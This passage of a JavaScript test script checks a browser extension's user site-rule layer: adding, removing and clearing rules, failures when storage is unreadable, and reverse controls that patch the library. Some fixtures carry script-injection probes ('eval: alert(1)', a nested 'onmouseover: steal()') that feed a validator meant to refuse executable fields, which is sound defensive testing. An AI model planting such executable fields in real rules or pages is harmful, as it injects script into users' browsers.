  seed({ ...mkRule('github'), match: { host_pattern: ['github.com'] } }, mkRule('fix13-c'));
  const attached = [];
  chrome.tabs.sendMessage = async (tabId, msg, opts) => {
    attached.push(msg.args);
    const doc = buildDoc(FIXTURES[0]);
    const h = new El('h1');
    h.setAttribute('id', 'user-title');
    h.appendChild(new Text('user-visible title'));
    doc.querySelector('body').appendChild(h);
    const engine = loadEngine(doc);
    const r = await engine.extractSite({ max_chars: 50000, rules: msg.args.rules });
    return { ok: true, result: r, frameId: opts?.frameId ?? 0, docEpoch: 'fix13' };
  };
  const before = await ctl.bridge(1, 'extractSite', { max_chars: 50000 });
  ok('撤销前：read_site 的候选集里确实有那条同 id 用户覆盖（否则撤销无从谈起）',
    attached[0].rules.length === 7 && attached[0].rules[0].id === 'github' && /USER github/.test(deep(attached[0].rules[0])), deep({ n: attached[0].rules?.length, first: attached[0].rules?.[0]?.id }));
  ok('…页面吃到的也是用户那条（USER 前缀），不是打包的', before.rule === 'github' && before.text.startsWith('USER github'), deep({ rule: before.rule, text: String(before.text).slice(0, 60) }));
  const dropped = await call('site.rules.remove', { id: 'fix13-c', confirm: true });
  const mid = await ctl.bridge(1, 'extractSite', { max_chars: 50000 });
  ok('缓存作废后候选集真的变小：7 条 → 6 条（storage 少一条，帧上就少一条）',
    dropped.removed === 'fix13-c' && attached[1].rules.length === 6 && !attached[1].rules.some((r) => /fix13-c/.test(deep(r))), deep({ n: attached[1].rules?.length }));
  ok('…这一次 remove 没碰同 id 的 github 覆盖（它还压着 builtin）',
    /USER github/.test(deep(attached[1].rules[0])) && mid.text.startsWith('USER github'), deep({ first: attached[1].rules[0]?.id, text: String(mid.text).slice(0, 40) }));
  const unshadow = await call('site.rules.remove', { id: 'github', confirm: true });
  ok('撤掉同 id 用户覆盖：回答点名打包那条重新生效（fix6 的用户优先是可逆的）',
    unshadow.removed === 'github' && unshadow.was_shadowing_builtin === true && unshadow.builtin_now_effective === 'github' && rawIds().length === 0, deep(unshadow).slice(0, 220));
  const after = await ctl.bridge(1, 'extractSite', { max_chars: 50000 });
  ok('…read_site 的候选集回落到 6 条 builtin，页面吃到打包那条',
    attached[2].rules.length === 6 && !attached[2].rules.some((r) => /USER github/.test(deep(r))) && after.rule === 'github' && after.text.startsWith('# ubb/repo'),
    deep({ n: attached[2].rules?.length, rule: after.rule, text: String(after.text).slice(0, 40) }));
  const listed = await call('site.rules.list', {});
  ok('…list 里 github 的 source/removable 也跟着回落', listed.counts.user === 0 && listed.rules.find((r) => r.id === 'github')?.source === 'builtin' && listed.rules.find((r) => r.id === 'github')?.removable === false, deep(listed.counts));
}
{
  seed(mkRule('clear-me-1'), mkRule('clear-me-2'), { ...mkRule('github'), match: { host_pattern: ['github.com'] } });
  const warm = await call('site.rules.reload', {});
  ok('clear 起点：3 条用户覆盖 + 5 条 builtin 已 warm 进缓存', warm.total === 8 && rawIds().length === 3, deep({ total: warm.total, layer: rawIds() }));
  const cleared = await call('site.rules.clear', { confirm: true });
  ok('clear：cleared 就是 storage 真少掉的条数（3），一条不多一条不少',
    cleared.cleared === 3 && cleared.removed_ids.slice().sort().join(',') === 'clear-me-1,clear-me-2,github', deep(cleared).slice(0, 220));
  ok('clear 后 storage 里是空数组（不是残留、不是键没了却装作删过）', Array.isArray(rawLayer()) && rawLayer().length === 0, deep(rawLayer()));
  ok('clear 当场作废缓存，装配结果回到 6 条 builtin 的原序',
    ctl.getSiteRulesCache() === null && (await sitesMod.effectiveSiteRules()).map((r) => r.id).join(',') === IDS.join(','), deep(rawLayer()));
  const list = await call('site.rules.list', {});
  ok('清完 list 回落 6 条 builtin（user:0，全部 removable:false，undo 改口）',
    list.counts.total === 6 && list.counts.user === 0 && list.rules.every((r) => r.source === 'builtin' && r.removable === false) && /no user overrides/.test(list.undo), deep({ c: list.counts, undo: list.undo }));
  const again = await call('site.rules.clear', { confirm: true });
  ok('对空层再 clear：cleared:0 + removed_ids 空 + note 说 already empty（不许装作删了东西）',
    again.cleared === 0 && Array.isArray(again.removed_ids) && again.removed_ids.length === 0 && /already empty/.test(again.note || '') && again.effective_rules === 6, deep(again).slice(0, 240));
  ok('空层 clear 没写脏东西：storage 仍是空数组，builtin 一个字没动', deep(rawLayer()) === '[]' && (await call('site.rules.list', {})).counts.builtin === 6, deep(rawLayer()));
}
{
  const junk = { id: 'hand-typed', eval: 'alert(1)' }; // §F4 的真实形状：SW 控制台手打进来的一条
  seed(junk, mkRule('keep-me'));
  const listed = await call('site.rules.list', {});
  ok('手打的坏条目进不了 list（user 只数可读的那条），但它确实占着 storage',
    listed.counts.user === 1 && /hand-typed/.test(deep(rawLayer())), deep({ c: listed.counts, layer: rawIds() }));
  const one = await call('site.rules.remove', { id: 'keep-me', confirm: true });
  ok('remove 只删它点名的那条：坏条目原样留在 storage（不许顺手清掉别的）',
    deep(rawLayer()) === deep([junk]) && one.removed_layer_entries === 1 && one.user_rule_ids.length === 0, deep(rawLayer()).slice(0, 180));
  seed(junk, mkRule('keep-me'));
  const cleared = await call('site.rules.clear', { confirm: true });
  ok('clear 报的是真少掉的条数（坏条目也占一条），并点名 malformed_entries_dropped',
    cleared.cleared === 2 && cleared.malformed_entries_dropped === 1 && cleared.removed_ids.join(',') === 'keep-me', deep(cleared).slice(0, 220));
  ok('坏条目一起清干净：storage 现在是空数组', deep(rawLayer()) === '[]', deep(rawLayer()));
}
{
  seed(mkRule('storage-live'));
  const snap = deep(rawLayer());
  const realGet = chrome.storage.local.get;
  const realSet = chrome.storage.local.set;
  const sets = [];
  chrome.storage.local.get = async () => { throw new Error('storage unavailable'); };
  chrome.storage.local.set = async (items) => { sets.push(deep(items)); return realSet(items); };
  const r1 = await errOf(() => call('site.rules.remove', { id: 'storage-live', confirm: true }));
  const r2 = await errOf(() => call('site.rules.clear', { confirm: true }));
  chrome.storage.local.get = realGet;
  chrome.storage.local.set = realSet;
  ok('读不到 storage 时 remove 直接红（不许把它当空层回个"本来就没有"）',
    r1.code === 'SITE_RULE_STORAGE_UNREADABLE' && /NOTHING was touched/.test(r1.msg), deep(r1).slice(0, 180));
  ok('读不到 storage 时 clear 也不落笔：一次 set 都没发生，用户层原样还在',
    r2.code === 'SITE_RULE_STORAGE_UNREADABLE' && sets.length === 0 && deep(rawLayer()) === snap, deep({ r2: r2.code, sets: sets.length, layer: rawLayer() }).slice(0, 180));
}
// ============================================================ 9. fix14: the same gate on site.rules.add
console.log('\n[9] fix14: site.rules.add 也不许把读不到的层当成空层写回');
{
  seed(mkRule('fix14-a'), mkRule('fix14-b'));
  const snap = deep(rawLayer());
  const realGet = chrome.storage.local.get;
  const realSet = chrome.storage.local.set;
  const sets = [];
  chrome.storage.local.get = async () => { throw new Error('storage unavailable'); };
  chrome.storage.local.set = async (items) => { sets.push(deep(items)); return realSet(items); };
  const noConfirm = await errOf(() => call('site.rules.add', { rule: mkRule('fix14-c') }));
  const badRule = await errOf(() => call('site.rules.add', { rule: { id: 'fix14-c', match: { host_pattern: ['blog.example.com'] }, extract: [{ op: 'text', select: 'h1' }], eval: 'alert(1)' }, confirm: true }));
  const r = await errOf(() => call('site.rules.add', { rule: mkRule('fix14-c'), confirm: true }));
  chrome.storage.local.get = realGet;
  chrome.storage.local.set = realSet;
  ok('读不到 storage 时 add 红在 SITE_RULE_STORAGE_UNREADABLE（不把它当空层）',
    r.code === 'SITE_RULE_STORAGE_UNREADABLE' && /NOTHING was touched/.test(r.msg), deep(r).slice(0, 180));
  ok('读不到 storage 时 add 一次 chrome.storage.local.set 都没发生', sets.length === 0, deep({ sets: sets.length, payloads: sets }).slice(0, 180));
  ok('读失败后用户层在 storage 里原样还在（判据是 storage，不是返回值）',
    deep(rawLayer()) === snap && rawIds().join(',') === 'fix14-a,fix14-b', deep(rawLayer()).slice(0, 220));
  ok('闸门顺序没被挪走：confirm 与 validate 都站在这一次读之前（storage 坏了也先红 NEEDS_CONFIRM / SITE_RULE_INVALID）',
    noConfirm.code === 'NEEDS_CONFIRM' && badRule.code === 'SITE_RULE_INVALID' && sets.length === 0,
    deep({ noConfirm: noConfirm.code, badRule: badRule.code }).slice(0, 160));
  const after = await call('site.rules.add', { rule: mkRule('fix14-c'), confirm: true });
  ok('storage 恢复后 add 照常落盘：旧的两条原样在，新的排最前（防护不等于永久拒写）',
    after.stored === 'fix14-c' && rawIds().join(',') === 'fix14-c,fix14-a,fix14-b' && deep(rawLayer()).includes('USER fix14-a'),
    deep({ stored: after.stored, replaced: after.replaced, layer: rawIds() }).slice(0, 220));
  const cleaned = await call('site.rules.clear', { confirm: true });
  ok('收尾：这一组没往 storage 里留东西', cleaned.cleared === 3 && deep(rawLayer()) === '[]', deep(rawLayer()).slice(0, 160));
}
{
  const { pathToFileURL: p2u } = await import('node:url');
  const mcpMod = await import(p2u(path.join(ROOT, 'daemon', 'mcp-tools', 'sites.mjs')).href);
  const names = mcpMod.SITES_TOOLS.map((t) => t.name);
  ok('精选目录没给撤销两条配 ubb_*（它们走 ubb_call，可达即可）',
    !names.includes('ubb_site_rules_remove') && !names.includes('ubb_site_rules_clear'), names.join(','));
  const mcpList = mcpMod.SITES_TOOLS.find((t) => t.name === 'ubb_site_rules_list')?.description || '';
  ok('但精选的 list 描述把两条撤销路连同 confirm:true 一起教了',
    /site\.rules\.remove/.test(mcpList) && /site\.rules\.clear/.test(mcpList) && /"confirm":true/.test(mcpList), mcpList.slice(0, 200));
}
disk.delete(SITE_RULES_KEY);
ctl.invalidateSiteRules();

// ============================================================ 7. reverse controls
console.log('\n[7] reverse controls');
async function patchedLib(patchFile, from, to, tag) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), `ubb-sites-${tag}-`));
  fs.cpSync(path.resolve(fileURLToPath(LIB)), path.join(dir, 'lib'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'package.json'), '{"type":"module"}');
  const p = path.join(dir, 'lib', patchFile);
  const src = fs.readFileSync(p, 'utf8');
  if (!src.includes(from)) throw new Error(`patch anchor missing in ${patchFile}: ${from}`);
  fs.writeFileSync(p, src.replace(from, to));
  return new URL('lib/', pathToFileURL(dir + '/'));
}

function assertExecutableGuard(mod, label) {
  const rep = mod.validateRules([{ id: 'evil', match: { host_pattern: ['a.com'] }, eval: 'alert(1)', extract: [{ op: 'text', select: 'h1' }] }]);
  ok(`${label}: a rule with eval is refused`, rep.ok === false && rep.issues.some((i) => i.kind === 'executable_field'), deep(rep).slice(0, 200));
  const nested = mod.validateRules([{ id: 'evil2', match: { host_pattern: ['a.com'] }, extract: [{ op: 'group', then: [{ op: 'reset', onmouseover: 'steal()' }] }] }]);
  ok(`${label}: a nested on* handler is refused`, nested.ok === false && nested.issues.some((i) => i.kind === 'executable_field'), deep(nested.issues).slice(0, 200));
}

async function assertUserPriority(mod, name = 'user override') {
  const merged = mod.mergeRules([{ id: 'github', match: { host_pattern: ['github.com'] }, extract: [{ op: 'text', select: 'h1' }] }], PACKAGED.rules);
  ok(`${name}: user rule leads the merged list`, merged[0].id === 'github' && merged.length === 6 && !merged.slice(1).some((r) => r.id === 'github'), merged.map((r) => r.id).join(','));
  const doc = buildDoc(FIXTURES[0]);
  const engine = loadEngine(doc);
  const r = await engine.extractSite({ max_chars: 50000, rules: merged });
  ok(`${name}: the frame picks the user rule`, r.text.startsWith('# ') === false, deep({ text: String(r.text).slice(0, 80) }));
}

if (!RC) {
  assertExecutableGuard(sitesMod, 'shipped lib');
  await assertUserPriority(sitesMod, 'shipped lib');
  ok('--rc=1/2/3 documented for the three reverse controls', true);
} else {
  console.log(`  — reverse control rc=${RC} running; failures below are the point`);
  if (RC === '1') {
    await assertEquivalent(FIXTURES[0], rc1BrokenRules());
  } else if (RC === '2') {
    const url = await patchedLib('tools-sites.js', 'const EXECUTABLE_KEY = /^(', 'const EXECUTABLE_KEY = /^(?!)^(', 'rc2');
    const mod = await import(new URL('tools-sites.js', url));
    assertExecutableGuard(mod, 'guard neutered');
  } else if (RC === '3') {
    const url = await patchedLib('tools-sites.js', '  return [...user, ...builtin.filter((r) => !ids.has(r.id))];', '  return [...builtin, ...user];', 'rc3');
    const mod = await import(new URL('tools-sites.js', url));
    await assertUserPriority(mod, 'merge order flipped');
  } else {
    console.log(`  ✗ unknown --rc=${RC}`);
    fail++;
  }
}

console.log(`\n${pass} passed, ${fail} failed${RC ? ` (rc=${RC})` : ''}`);
process.exit(fail ? 1 : 0);
